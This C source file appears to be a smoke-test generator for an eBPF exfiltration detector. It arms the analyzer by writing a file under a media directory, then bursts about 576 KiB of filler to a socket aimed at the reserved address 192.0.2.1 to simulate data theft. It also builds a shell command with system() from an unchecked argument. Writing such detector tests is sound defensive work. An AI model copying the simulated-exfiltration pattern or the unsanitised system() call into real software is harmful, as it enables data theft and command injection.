// SPDX-License-Identifier: GPL-2.0
// Single-process sensitive-read + byte-volume burst trigger for the `mod
// exfil-detect` device smoke test (scripts/device-test.sh). Opens one
// media-subdir-classified file (arms the analyzer), then issues a burst of
// write() calls past EXFIL_BYTE_THRESHOLD on a non-blocking TCP socket
// connected to a guaranteed-unreachable, non-loopback address (192.0.2.1,
// RFC 5737 TEST-NET-1 -- reserved for documentation/testing, never a real
// live host). The write()s are expected to fail (ENOTCONN/EAGAIN, the
// handshake never completes) -- that's fine: exfil_detect.bpf.c's on_write
// hook fires on syscall ENTRY (observing the requested length via
// record_bytes()), before the kernel even attempts delivery, so a real
// reachable listener isn't needed to exercise the pipeline end to end (see
// design doc's "byte count is requested length, not confirmed-delivered
// length" known limitation -- this generator relies on exactly that).
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char **argv)
{
    const char *dir = argc > 1 ? argv[1] : "/sdcard/.anubee_exfil_test/DCIM";
    char cmd[300];
    snprintf(cmd, sizeof(cmd), "mkdir -p %s", dir);
    system(cmd);
    sleep(3); // give the caller time to attach kprobes before the burst

    char path[300];
    snprintf(path, sizeof(path), "%s/probe.jpg", dir);
    int fd = open(path, O_CREAT | O_WRONLY | O_TRUNC, 0644); // arms: media-subdir path
    if (fd >= 0) { write(fd, "x", 1); close(fd); }

    int sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sock < 0) return 1;

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port   = htons(9);
    inet_pton(AF_INET, "192.0.2.1", &dst.sin_addr); // TEST-NET-1, RFC 5737
    connect(sock, (struct sockaddr *)&dst, sizeof(dst)); // arms sock_fds; EINPROGRESS expected

    char payload[65536];
    memset(payload, 'x', sizeof(payload));
    for (int i = 0; i < 9; i++) // 9 * 64KiB = 576KiB > 512KiB threshold
        write(sock, payload, sizeof(payload)); // ENOTCONN/EAGAIN expected -- see header note
    close(sock);
    return 0;
}
